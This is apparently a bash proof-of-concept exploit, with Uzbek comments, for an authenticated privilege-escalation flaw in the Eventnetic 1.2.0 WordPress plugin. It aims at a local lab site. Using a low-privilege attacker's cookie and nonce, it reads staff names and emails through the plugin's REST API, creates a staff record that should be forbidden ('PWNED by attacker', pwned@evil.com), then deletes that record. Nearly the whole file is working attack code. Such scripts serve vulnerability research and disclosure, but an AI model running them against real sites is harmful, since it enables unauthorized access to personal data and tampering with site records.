#!/bin/bash
# Eventnetic 1.2.0 - Authenticated (Staff+) Privilege Escalation PoC
# CVE-2026-XXXXX
#
# Ishlatish:
#   ./poc-curl.sh <cookie> <nonce>

set -e

TARGET="http://cve-lablocal.local"
COOKIE="${1:?Attacker cookie kerak}"
NONCE="${2:?Nonce kerak}"

echo "==============================================="
echo "Eventnetic 1.2.0 - CVE-2026-XXXXX PoC"
echo "==============================================="
echo ""

echo "[1] Version tekshirish..."
grep "Version:" ~/Local\ Sites/cve-lablocal/app/public/wp-content/plugins/eventnetic/eventnetic.php

echo ""
echo "[2] Attacker autentifikatsiyasi..."
curl -s "$TARGET/wp-json/eventnetic/v1/staff?limit=5" \
  -H "Cookie: $COOKIE" -H "X-WP-Nonce: $NONCE" | jq -r '.data.data[] | "  ID=\(.id) name=\(.name) email=\(.email)"'

echo ""
echo "[3] Test A: staff list o'qish"
curl -s "$TARGET/wp-json/eventnetic/v1/staff?limit=100" \
  -H "Cookie: $COOKIE" -H "X-WP-Nonce: $NONCE" | jq '.data.meta'

echo ""
echo "[4] Test B: staff_add (TAQIQLANGAN) - CRITICAL"
RESPONSE=$(curl -s -X POST "$TARGET/wp-json/eventnetic/v1/staff" \
  -H "Cookie: $COOKIE" -H "X-WP-Nonce: $NONCE" \
  -H "Content-Type: application/json" \
  -d '{"name":"PWNED by attacker","email":"pwned@evil.com","phone":"+10000000000","isActive":true}')

echo "  Response: $RESPONSE"

if echo "$RESPONSE" | grep -q '"id"'; then
  echo ""
  echo "  [!!!] ZAIFLIK TASDIQLANDI: staff_add ishladi!"
  NEW_ID=$(echo "$RESPONSE" | jq -r '.data.id')
  echo "  Yangi staff ID = $NEW_ID"
else
  echo "  [OK] himoyalangan"
fi

echo ""
echo "[5] Test E: staff_delete (TAQIQLANGAN)"
curl -s -X DELETE "$TARGET/wp-json/eventnetic/v1/staff/$NEW_ID" \
  -H "Cookie: $COOKIE" -H "X-WP-Nonce: $NONCE" | jq '.'

echo ""
echo "==============================================="
echo "PoC tugadi"
echo "==============================================="
